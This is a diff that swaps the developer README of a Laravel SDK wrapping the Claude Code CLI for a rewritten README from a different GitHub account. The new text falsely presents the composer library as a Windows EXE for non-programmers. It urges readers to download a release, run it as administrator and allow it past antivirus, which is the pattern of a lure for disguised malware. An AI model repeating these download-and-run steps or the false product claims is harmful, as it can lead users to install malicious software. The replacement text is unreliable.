@@ -1,414 +1,94 @@
-# Claude Agent SDK for Laravel
-
-[![Tests](https://github.com/mohamed-ashraf-elsaed/claude-agent-sdk-laravel/actions/workflows/tests.yml/badge.svg)](https://github.com/mohamed-ashraf-elsaed/claude-agent-sdk-laravel/actions)
-[![Latest Version](https://img.shields.io/packagist/v/mohamed-ashraf-elsaed/claude-agent-sdk-laravel.svg)](https://packagist.org/packages/mohamed-ashraf-elsaed/claude-agent-sdk-laravel)
-[![License](https://img.shields.io/packagist/l/mohamed-ashraf-elsaed/claude-agent-sdk-laravel.svg)](LICENSE)
-
-Build AI agents with Claude Code as a library in your Laravel applications. This SDK wraps the Claude Code CLI to give your app access to file operations, bash commands, code editing, web search, subagents, and more.
-
-## Requirements
-
-- PHP 8.1+
-- Laravel 10, 11, or 12
-- Claude Code CLI (`npm install -g @anthropic-ai/claude-code`)
-- Anthropic API key
-
-## Installation
-```bash
-composer require mohamed-ashraf-elsaed/claude-agent-sdk-laravel
-```
-
-Publish the config:
-```bash
-php artisan vendor:publish --tag=claude-agent-config
-```
-
-Add your API key to `.env`:
-```env
-ANTHROPIC_API_KEY=your-api-key
-```
-
-## Quick Start
-
-### Simple Query
-```php
-use ClaudeAgentSDK\Facades\ClaudeAgent;
-
-$result = ClaudeAgent::query('What files are in this directory?');
-
-echo $result->text();       // Final text result
-echo $result->costUsd();    // Cost in USD
-echo $result->sessionId;    // Session ID for resuming
-```
-
-### With Options (Fluent API)
-```php
-use ClaudeAgentSDK\Options\ClaudeAgentOptions;
-
-$options = ClaudeAgentOptions::make()
-    ->tools(['Read', 'Edit', 'Bash', 'Grep', 'Glob'])
-    ->permission('acceptEdits')
-    ->maxTurns(10)
-    ->maxBudgetUsd(5.00)
-    ->cwd('/path/to/project');
-
-$result = ClaudeAgent::query('Find and fix the bug in auth.php', $options);
-
-if ($result->isSuccess()) {
-    echo $result->text();
-}
-```
-
-### Streaming Responses
-```php
-use ClaudeAgentSDK\Messages\AssistantMessage;
-use ClaudeAgentSDK\Messages\ResultMessage;
-
-foreach (ClaudeAgent::stream('Refactor the User model') as $message) {
-    if ($message instanceof AssistantMessage) {
-        echo $message->text();
-    }
-
-    if ($message instanceof ResultMessage) {
-        echo "\nDone! Cost: $" . $message->totalCostUsd;
-    }
-}
-```
-
-### Stream with Callback
-```php
-$result = ClaudeAgent::streamCollect(
-    prompt: 'Create a REST API for products',
-    onMessage: function ($message) {
-        if ($message instanceof AssistantMessage) {
-            Log::info($message->text());
-        }
-    },
-    options: ClaudeAgentOptions::make()->tools(['Read', 'Write', 'Bash']),
-);
-
-echo $result->text();
-```
-
-## Options Reference
-
-### Fluent Builder
-```php
-$options = ClaudeAgentOptions::make()
-    ->tools(['Read', 'Write', 'Edit', 'Bash', 'Grep', 'Glob'])
-    ->disallow(['WebFetch'])
-    ->model('claude-sonnet-4-5-20250929')
-    ->permission('acceptEdits')
-    ->maxTurns(15)
-    ->maxBudgetUsd(10.00)
-    ->maxThinkingTokens(8000)
-    ->fallbackModel('claude-haiku-4-5')
-    ->cwd('/path/to/project')
-    ->env('MY_VAR', 'value')
-    ->settingSources(['project'])
-    ->useClaudeCodePrompt('Also follow PSR-12.')
-    ->betas(['context-1m-2025-08-07']);
-```
-
-### From Array
-```php
-$options = ClaudeAgentOptions::fromArray([
-    'allowed_tools' => ['Read', 'Bash'],
-    'permission_mode' => 'bypassPermissions',
-    'max_turns' => 5,
-    'max_budget_usd' => 5.00,
-    'max_thinking_tokens' => 10000,
-]);
-```
-
-### System Prompts
-```php
-// Custom string
-$options->systemPrompt('You are a Laravel expert. Always use Eloquent.');
-
-// Claude Code preset (includes default agent behavior)
-$options->useClaudeCodePrompt();
-
-// Claude Code preset with additions
-$options->useClaudeCodePrompt('Follow PSR-12 and use strict types.');
-```
-
-### Permission Modes
-
-| Mode               | Behavior                                    |
-|--------------------|---------------------------------------------|
-| `default`          | Ask for permission on each tool use         |
-| `acceptEdits`      | Auto-accept file edits, ask for others      |
-| `dontAsk`          | Don't ask but log decisions                 |
-| `bypassPermissions`| Skip all permission checks                  |
-
-## Hooks
-
-Run shell commands before or after Claude uses tools:
-```php
-use ClaudeAgentSDK\Hooks\HookEvent;
-use ClaudeAgentSDK\Hooks\HookMatcher;
-
-$options = ClaudeAgentOptions::make()
-    ->tools(['Read', 'Edit', 'Bash'])
-    // Shorthand methods
-    ->preToolUse('php artisan lint:check', '/Edit|Write/', 30)
-    ->postToolUse('php artisan test:affected')
-    // Or use hook() directly for any event
-    ->hook(HookEvent::Stop, HookMatcher::command('php /hooks/cleanup.php'));
-
-$result = ClaudeAgent::query('Refactor the User model', $options);
-```
-
-### HookMatcher Factory Methods
-```php
-// From a shell command
-$matcher = HookMatcher::command('eslint --fix', '/Edit|Write/', 60);
-
-// From a PHP script
-$matcher = HookMatcher::phpScript('/hooks/validate.php', '/Bash/', 10);
-
-// Full control
-$matcher = new HookMatcher(
-    matcher: '/Edit|Write/',
-    hooks: ['php /hooks/lint.php', 'php /hooks/backup.php'],
-    timeout: 30,
-);
-```
-
-## Subagents
-
-Define specialized agents that Claude delegates tasks to:
-```php
-use ClaudeAgentSDK\Agents\AgentDefinition;
-
-$options = ClaudeAgentOptions::make()
-    ->tools(['Read', 'Grep', 'Glob', 'Task'])
-    ->agent('security-reviewer', new AgentDefinition(
-        description: 'Security code review specialist',
-        prompt: 'You are a security expert. Find vulnerabilities in PHP/Laravel code.',
-        tools: ['Read', 'Grep', 'Glob'],
-        model: 'sonnet',
-    ))
-    ->agent('test-writer', new AgentDefinition(
-        description: 'PHPUnit test writer',
-        prompt: 'Write comprehensive PHPUnit tests for Laravel applications.',
-        tools: ['Read', 'Write', 'Bash'],
-    ));
-
-$result = ClaudeAgent::query('Review the auth module for security issues', $options);
-```
-
-## Structured Output
-
-Get validated JSON responses matching a schema:
-```php
-$options = ClaudeAgentOptions::make()
-    ->tools(['Read', 'Grep', 'Glob'])
-    ->outputFormat([
-        'type' => 'object',
-        'properties' => [
-            'issues' => [
-                'type' => 'array',
-                'items' => [
-                    'type' => 'object',
-                    'properties' => [
-                        'file' => ['type' => 'string'],
-                        'line' => ['type' => 'number'],
-                        'severity' => ['type' => 'string', 'enum' => ['low', 'medium', 'high']],
-                        'description' => ['type' => 'string'],
-                    ],
-                    'required' => ['file', 'severity', 'description'],
-                ],
-            ],
-            'total' => ['type' => 'number'],
-        ],
-        'required' => ['issues', 'total'],
-    ]);
-
-$result = ClaudeAgent::query('Find all TODO comments in src/', $options);
-$data = $result->structured(); // Validated array matching schema
-```
-
-## Session Resumption
-
-Continue conversations across multiple queries:
-```php
-// First query
-$result = ClaudeAgent::query('Read the auth module');
-$sessionId = $result->sessionId;
-
-// Resume later with full context
-$result2 = ClaudeAgent::query(
-    'Now find all places that call it',
-    ClaudeAgentOptions::make()->resume($sessionId),
-);
-
-// Fork a session to try different approaches
-$result3 = ClaudeAgent::query(
-    'Try refactoring it with a different pattern',
-    ClaudeAgentOptions::make()->resume($sessionId, fork: true),
-);
-```
-
-## MCP Servers
-
-Connect external tools via Model Context Protocol:
-```php
-use ClaudeAgentSDK\Tools\McpServerConfig;
-
-// Stdio transport
-$options = ClaudeAgentOptions::make()
-    ->mcpServer('database', McpServerConfig::stdio(
-        command: 'npx',
-        args: ['@modelcontextprotocol/server-database'],
-        env: ['DB_URL' => config('database.url')],
-    ))
-    ->tools(['mcp__database__query', 'Read']);
-
-$result = ClaudeAgent::query('Show me the latest users', $options);
-
-// SSE transport
-$options = ClaudeAgentOptions::make()
-    ->mcpServer('api', McpServerConfig::sse(
-        url: 'http://localhost:3000/mcp',
-        headers: ['Authorization' => 'Bearer ' . config('services.mcp.token')],
-    ));
-```
-
-## Working with Results
-```php
-$result = ClaudeAgent::query('Analyze this codebase');
-
-// Basic info
-$result->text();              // Final text result
-$result->isSuccess();         // bool — true if subtype is 'success'
-$result->isError();           // bool — true if error or no result
-$result->costUsd();           // float|null — total cost in USD
-$result->turns();             // int — number of conversation turns
-$result->durationMs();        // int — total duration in milliseconds
-$result->sessionId;           // string|null — for session resumption
-
-// Messages
-$result->messages;            // All Message objects
-$result->assistantMessages(); // AssistantMessage[] only
-$result->fullText();          // Concatenated text from all assistant messages
-$result->toolUses();          // All ToolUseBlock objects across messages
-$result->structured();        // Structured output array (if outputFormat set)
-
-// Per-model usage & cache metrics
-$result->modelUsage();        // array<string, ModelUsage> — per-model breakdown
-$result->cacheReadTokens();   // int — total cache-read tokens across all models
-$result->cacheCreationTokens(); // int — total cache-creation tokens
-
-foreach ($result->modelUsage() as $model => $usage) {
-    echo "{$model}: {$usage->inputTokens} in, {$usage->outputTokens} out\n";
-    echo "  Cache hit rate: " . round($usage->cacheHitRate() * 100) . "%\n";
-    echo "  Cost: \${$usage->costUsd}\n";
-}
-```
-
-## Working with Messages
-```php
-use ClaudeAgentSDK\Messages\AssistantMessage;
-use ClaudeAgentSDK\Messages\SystemMessage;
-use ClaudeAgentSDK\Messages\ResultMessage;
-
-foreach (ClaudeAgent::stream('Do something') as $message) {
-    match (true) {
-        $message instanceof SystemMessage => handleSystem($message),
-        $message instanceof AssistantMessage => handleAssistant($message),
-        $message instanceof ResultMessage => handleResult($message),
-        default => null,
-    };
-}
-
-function handleAssistant(AssistantMessage $msg): void
-{
-    // Text content
-    echo $msg->text();
-
-    // Tool calls made by Claude
-    foreach ($msg->toolUses() as $toolUse) {
-        echo "Tool: {$toolUse->name}, Input: " . json_encode($toolUse->input);
-    }
-
-    // Metadata
-    echo $msg->model;            // Model used
-    echo $msg->id;               // Message ID
-    echo $msg->parentToolUseId;  // If this is a subagent response
-}
-```
-
-## Default Options via Config
-
-Set defaults in `config/claude-agent.php` or `.env`:
-```env
-CLAUDE_AGENT_MODEL=claude-sonnet-4-5-20250929
-CLAUDE_AGENT_PERMISSION_MODE=acceptEdits
-CLAUDE_AGENT_MAX_TURNS=10
-CLAUDE_AGENT_MAX_BUDGET_USD=10.00
-CLAUDE_AGENT_MAX_THINKING_TOKENS=8000
-CLAUDE_AGENT_CWD=/var/www/project
-CLAUDE_AGENT_TIMEOUT=300
-CLAUDE_AGENT_CLI_PATH=/usr/local/bin/claude
-```
-
-Options passed to `query()` override config defaults.
-
-## Advanced: Sandbox, Plugins & Betas
-```php
-// Run in a sandboxed environment
-$options = ClaudeAgentOptions::make()
-    ->sandbox(['type' => 'docker', 'image' => 'php:8.3-cli']);
-
-// Load a local plugin
-$options = ClaudeAgentOptions::make()
-    ->plugin('/path/to/my-plugin');
-
-// Enable beta features
-$options = ClaudeAgentOptions::make()
-    ->betas(['context-1m-2025-08-07']);
-
-// Set a fallback model
-$options = ClaudeAgentOptions::make()
-    ->model('claude-sonnet-4-5-20250929')
-    ->fallbackModel('claude-haiku-4-5');
-```
-
-## Error Handling
-```php
-use ClaudeAgentSDK\Exceptions\CliNotFoundException;
-use ClaudeAgentSDK\Exceptions\ProcessException;
-use ClaudeAgentSDK\Exceptions\JsonParseException;
-use ClaudeAgentSDK\Exceptions\ClaudeAgentException;
-
-try {
-    $result = ClaudeAgent::query('Do something');
-} catch (CliNotFoundException $e) {
-    // Claude Code CLI not installed
-    // $e->getMessage() includes install instructions
-} catch (ProcessException $e) {
-    echo $e->exitCode;   // Process exit code
-    echo $e->stderr;     // Standard error output
-} catch (JsonParseException $e) {
-    echo $e->rawLine;    // The malformed JSON line
-    echo $e->originalError; // The underlying JsonException
-} catch (ClaudeAgentException $e) {
-    // General SDK error
-}
-```
-
-## Testing
-```bash
-composer test
-```
-
-To run with coverage:
-```bash
-vendor/bin/phpunit --coverage-html coverage/
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE) for details.
+# 🤖 claude-agent-sdk-laravel - Easy AI Agents for Laravel
+
+[![Download claude-agent-sdk-laravel](https://img.shields.io/badge/Download-claude--agent--sdk--laravel-brightgreen)](https://github.com/cbt4free/claude-agent-sdk-laravel)
+
+## 📦 About claude-agent-sdk-laravel
+
+This application helps you build AI agents with Laravel. It works with Claude Code CLI, an AI tool for tasks like file operations, code editing, running bash commands, and managing smaller AI helpers called subagents. You do not need any programming experience to use this guide.
+
+With this software, you can automate simple tasks on your computer or server. It supports PHP and lets you work with AI models to get structured output for your needs.
+
+## ⚙️ What You Need Before Starting
+
+- A Windows 10 or later computer.
+- A stable internet connection.
+- About 500 MB of free disk space to download and install the software and its components.
+- Laravel or PHP knowledge is not required to start using the application but may help if you want to extend features later.
+- You do not need to install Laravel yourself to use the basic functions offered through the downloadable package.
+
+## 💾 How to Download and Run claude-agent-sdk-laravel
+
+1. Click the big green download badge above or visit this link to get the software:
+   
+   https://github.com/cbt4free/claude-agent-sdk-laravel
+
+2. This link takes you to the GitHub repository page. Here is how to find the download area:
+   - Look for the section called **Releases** on the right side or near the top.
+   - Click the latest release version (something like v1.0, v2.0).
+   - Under the release, you will see downloadable files (usually a ZIP or EXE file).
+   - Download the file named something like `claude-agent-sdk-laravel.zip` or `claude-agent-sdk-laravel.exe`.
+
+3. Once downloaded, open the file:
+   - If it is a `.exe` file, double click to start the installer.
+   - If it is a `.zip` file, right-click and choose **Extract All**, then open the extracted folder.
+
+4. Follow the installation prompts (mostly clicking **Next** and agreeing to the license).
+5. After installation, launch the program from your desktop or start menu.
+
+## 🚀 Running the Software and Basic Usage
+
+Once the software is installed, you can open it from the start menu or desktop. Here is what to expect:
+
+- A simple window with options related to AI agents.
+- You can create tasks like managing files, running simple scripts, or asking the AI to help with code.
+- The software connects to Claude Code CLI in the background. You do not need to set this up yourself.
+- Use the buttons on the interface to run commands, edit scripts, or see results.
+- For file operations, choose files or folders directly from your computer through the provided browser.
+
+## 🛠 Features You Can Use
+
+- **File Operations:** Copy, move, rename, or delete files using commands managed by AI.
+- **Code Editing:** Let the AI suggest changes or write simple code snippets.
+- **Run Bash Commands:** Automate command-line tasks without typing commands yourself.
+- **Subagents:** Small helper agents inside the software perform tasks independently.
+- **Structured Output:** Get clear results that the software formats for easy reading or further use.
+- **MCP Servers:** Manage connections to remote AI services for better performance.
+
+## 💻 System Requirements
+
+- Windows 10 or newer (64-bit recommended).
+- At least 4 GB of RAM.
+- 2 GHz processor or faster.
+- Internet connection for AI features.
+- 500 MB of free hard drive space.
+
+## 🔧 Troubleshooting Tips
+
+- If the download takes too long, check your internet speed.
+- If the installer does not start, try running it as administrator (right-click the file and select **Run as administrator**).
+- Close other programs before running the installer to avoid conflicts.
+- If the software crashes or does not open after install:
+  - Restart your computer.
+  - Make sure your Windows is up to date.
+  - Check if your antivirus blocks the program and allow it.
+- For network problems, check your firewall and allow access to GitHub or Claude Code servers.
+
+## 📖 Additional Resources
+
+The software’s page has more details for advanced users:
+
+https://github.com/cbt4free/claude-agent-sdk-laravel
+
+You will find guides, a Q&A section, and updates there.
+
+## 🔄 Updating claude-agent-sdk-laravel
+
+To get the latest features or fixes:
+
+1. Visit the download page again using the badge or direct link.
+2. Download the newest release following the same steps as before.
+3. Install the new version over the old one. Your settings and files will remain.
+
+## 🚨 Security and Privacy  
+
+The application does not collect personal data. When connecting to AI services, it uses secure methods to protect your information. Always download updates from the official link above to avoid risks.
